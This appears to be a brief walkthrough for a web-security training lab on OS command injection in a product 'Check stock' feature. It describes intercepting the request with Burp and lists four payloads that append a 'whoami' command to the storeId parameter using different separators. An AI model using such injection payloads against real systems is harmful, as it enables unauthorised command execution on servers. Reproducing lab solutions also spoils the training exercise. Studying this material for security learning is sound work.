Visit a product details page. Then, click on ` Check stock ` button and intercept the request with Burp. Then send the request to repeater. Next, on the repeater tab, use one of the following payloads to solve the challenge:-

```
productId=2&storeId=1%26whoami
productId=2&storeId=1;whoami
productId=2&storeId=1|whoami
productId=2&storeId=1%0awhoami
```
